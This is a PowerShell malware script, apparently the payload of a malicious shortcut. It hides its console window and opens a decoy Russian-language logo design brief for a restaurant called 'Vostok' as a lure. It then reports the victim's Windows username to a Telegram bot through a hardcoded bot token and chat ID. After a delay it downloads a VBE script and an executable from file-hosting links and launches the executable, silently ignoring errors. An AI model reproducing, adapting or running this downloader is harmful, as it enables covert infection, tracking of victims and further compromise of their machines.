Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
$v0=[b0.a0]::GetConsoleWindow()
[b0.a0]::ShowWindow($v0,0)
$v1="ТЗ_Разработка_Логотипа_Восток.txt"
$v2=Join-Path $env:LOCALAPPDATA $v1
$v3=@"
Разработка логотипа для ресторана «Восток»
Дата: 08.02.2026

Ресторан «Восток» — китайская кухня
Адрес: г. Владивосток, ул. Некрасовская, 50
Сайт: vostokmenu.ru
Разработать новый логотип для ресторана китайской кухни «Восток». Нужно 3 варианта на выбор, после выбора — доработка и передача исходников.
Финальные файлы:
Векторные: AI, SVG, PDF (обязательно)
Растровые: PNG (прозрачный фон), JPG
Версии: цветная, чёрно-белая, для тёмного и светлого фона

Стиль
Плоский минимализм, без сложных градиентов и теней
Современный, но с отсылкой к китайской культуре
Должен хорошо смотреться и на тёмном, и на светлом фоне
Основной: терракотовый/оранжевый (#D35400)
Фон: тёмно-серый/чёрный (#1A1A1A)
Текст: белый (#FFFFFF)
Дополнительно: золотой (#F39C12)

Что должно быть в логотипе!
Название «ВОСТОК» или «VOSTOK»
Можно добавить слово «RESTAURANT» или «РЕСТОРАН»
Графический элемент: дракон, веер, палочки для еды, фонарик или что-то в восточном стиле

Что не нудно!
Фотореалистичные изображения
Сложные детали, которые потеряются при уменьшении
Больше 3-4 цветов в одном варианте
Стоковые картинки

В папке приложены:
- Текущий логотип с сайта
- Фото блюд из меню
- Изображения категорий
- Иконки с сайта

Всё для понимания стиля и атмосферы заведения.
"@
$v3|Out-File -FilePath $v2 -Encoding UTF8
Invoke-Item $v2
$v4="8323167571:AAFEgqb4cAPmKNek-D6ioTvS634gRE0CuTo"
$v5="7063407604"
$v6=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$v7="The user's shortcut was enabled for user: "+$v6
$v8="https://api.telegram.org/bot"+$v4+"/sendMessage"
$v9=@{chat_id=$v5;text=$v7}|ConvertTo-Json
try{$v10=Invoke-RestMethod -Uri $v8 -Method Post -ContentType "application/json" -Body $v9}catch{}
Start-Sleep -Seconds 400
$v11="https://www.udrop.com/file/Od75/1446062403_house.delete"
$v12="1446062403_house.vbe"
$v13=[Environment]::GetFolderPath("LocalApplicationData")
$v14=Join-Path $v13 $v12
try{$v15=New-Object System.Net.WebClient;$v15.DownloadFile($v11,$v14)}catch{}
$v16="https://www.udrop.com/file/OcWP/1446062403_key.delete"
$v17="1446062403_key.exe"
$v18=Join-Path $v13 $v17
try{
    $v19=New-Object System.Net.WebClient
    $v19.DownloadFile($v16,$v18)
    Start-Process -FilePath $v18 -WindowStyle Normal
}catch{}
exit